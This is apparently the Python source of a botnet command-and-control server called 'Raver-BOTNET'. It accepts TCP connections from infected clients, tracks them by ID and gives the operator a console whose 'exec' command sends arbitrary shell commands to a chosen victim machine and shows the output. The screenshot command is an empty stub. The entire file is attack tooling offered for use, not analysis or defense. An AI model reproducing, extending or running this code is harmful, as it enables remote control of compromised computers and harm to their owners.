#!/usr/bin/python3
import socket
import threading
from colorama import Fore
import os
from os import name, system
import uuid
import shlex
import sqlite3

def RaverText():
    print(Fore.RED + """
 /$$$$$$$                                                  /$$$$$$$   /$$$$$$  /$$$$$$$$ /$$   /$$ /$$$$$$$$ /$$$$$$$$
| $$__  $$                                                | $$__  $$ /$$__  $$|__  $$__/| $$$ | $$| $$_____/|__  $$__/
| $$  \ $$  /$$$$$$  /$$    /$$ /$$$$$$   /$$$$$$         | $$  \ $$| $$  \ $$   | $$   | $$$$| $$| $$         | $$   
| $$$$$$$/ |____  $$|  $$  /$$//$$__  $$ /$$__  $$ /$$$$$$| $$$$$$$ | $$  | $$   | $$   | $$ $$ $$| $$$$$      | $$   
| $$__  $$  /$$$$$$$ \  $$/$$/| $$$$$$$$| $$  \__/|______/| $$__  $$| $$  | $$   | $$   | $$  $$$$| $$__/      | $$   
| $$  \ $$ /$$__  $$  \  $$$/ | $$_____/| $$              | $$  \ $$| $$  | $$   | $$   | $$\  $$$| $$         | $$   
| $$  | $$|  $$$$$$$   \  $/  |  $$$$$$$| $$              | $$$$$$$/|  $$$$$$/   | $$   | $$ \  $$| $$$$$$$$   | $$   
|__/  |__/ \_______/    \_/    \_______/|__/              |_______/  \______/    |__/   |__/  \__/|________/   |__/   
                                                                                                                      
by DontDieInVain V:0.0.0.1
    """)

def Clear():
    if name == "nt":
        os.system("cls")
    else:
        os.system("clear")

host = "0.0.0.0"
port = 5100
clients = []
offline_clients = []
lock = threading.Lock()
connection = sqlite3.connect("database.db")
cursor = connection.cursor()

def handle_client(conn, addr):
    with lock:
        clients.append((conn, addr, client_id))
    print(f"[+] Connection {addr[0]}:{addr[1]}")
    
    threading.Thread(target=listen_client, args=(conn, client_id), daemon=True).start()

def remove_client(conn, addr, client_id):
    with lock:
        for c in clients:
            if c[0] == conn:
                clients.remove(c)
                offline_clients.append((conn, addr, client_id))
                break              

def repl():
    while True:
        try:
            line = input("(Raver-BOTNET)> ").strip()
            if not line:
                continue
            parts = shlex.split(line)  # respeita aspas
            cmd, *args = parts
            func = COMMANDS.get(cmd)
            if func:
                func(args)
            else:
                print("Unknown command:", cmd)
        except SystemExit:
            break
        except Exception as e:
            print("Error:", e)

def cmd_help(args):
    print("""
--------------------------
help - Show this message
        
clients - Show Clients

exec - Execute a command in a client 

screenshot - Take a screenshot

exit - Quit the program
--------------------------

    """)
def cmd_clients(args):
    with lock:
        if not clients and not offline_clients:
            print("No clients")
        else:
            print("Online:")
            for i, (_, addr, cid) in enumerate(clients):
                print(f"{i+1}. {addr[0]}:{addr[1]} | ID={cid}")
            print("\nOffline:")
            for i, (_, addr, cid) in enumerate(offline_clients):
                print(f"{i+1}. {addr[0]}:{addr[1]} | ID={cid}")

def cmd_exec(args):
    if len(args) < 2:
        print("Usage: exec <id> <command>")
        return
    target_id = args[0]
    command = " ".join(args[1:])  # junta o resto dos argumentos no comando
    with lock:
        target_client = None
        for conn, addr, cid in clients:
            if cid == target_id:
                target_client = conn
                break
    if not target_client:
        print(f"Client with ID {target_id} not found or offline.")
        return
    try:
        send(target_id, command, target_client)
    except Exception as e:
        print(f"[!] Failed to send command: {e}")

def cmd_screenshot(args):
    pass

def send(target_id, command, target_client):
    target_client.send(command.encode())
    print(f"[>] Command sent to {target_id}: {command}")
        
def listen_client(conn, client_id):
    while True:
        try:
            data = conn.recv(4096).decode().strip()
            if data:
                print(f"[<] Mensagem de {client_id}:\n{data}")
        except ConnectionResetError:
            print(f"[!] Cliente {client_id} desconectou")
            break
        except Exception as e:
            print(f"[!] Erro ao receber mensagem de {client_id}: {e}")
            break

COMMANDS = {
    "help": cmd_help,
    "clients": cmd_clients,
    "exec": cmd_exec,
    "screenshot": cmd_screenshot,
    "quit": lambda args: (_ for _ in ()).throw(SystemExit())  # lançar SystemExit para sair
}

if __name__ == "__main__":
    Clear()
    RaverText()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen()
        print(Fore.GREEN + f"Server listening on port {port}")
        print("Type help for commands")
        threading.Thread(target=repl, daemon=True).start()
        while True:
            conn, addr = s.accept()  # addr = (ip, port)
            client_id = str(uuid.uuid4())
            t = threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
